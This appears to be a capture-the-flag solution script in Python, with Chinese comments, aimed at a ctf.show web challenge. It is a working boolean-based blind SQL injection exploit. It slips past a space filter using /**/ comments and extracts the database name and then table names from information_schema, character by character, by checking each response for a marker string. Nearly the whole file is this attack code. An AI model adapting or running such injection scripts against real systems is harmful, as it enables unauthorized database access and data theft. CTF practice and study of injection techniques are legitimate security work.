# coding: utf-8
import  requests
url = "http://ae2f712f-c979-4e00-8773-b3c9d2b17f20.challenge.ctf.show:8080/index.php?id=-1'/**/"


def db(url):  # 爆库名
    for i in range(1, 5):
        for j in range(32, 128):
            u = "or/**/ascii(substr(database()/**/from/**/" + str(i) + "/**/for/**/1))=" + str(j) + "#"
            s = url + u
            # print(s)
            r = requests.get(s)
            if 'By Rudyard Kipling' in r.text:
                print(chr(j))


def table(url):  # 爆表名
    for i in range(4):
        table_name = ''
        for j in range(1, 6):
            for k in range(48, 128):
                u = id = "||/**/ascii(substr((select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/limit/**/1/**/offset/**/" + str(
                    i) + ")/**/from/**/" + str(j) + "/**/for/**/1))=" + str(k) + "#"
                s = url + u
                # print(s)
                r = requests.get(s)
                if 'By Rudyard Kipling' in r.text:
                    table_name += chr(k)
            print(table_name)


db(url)
table(url)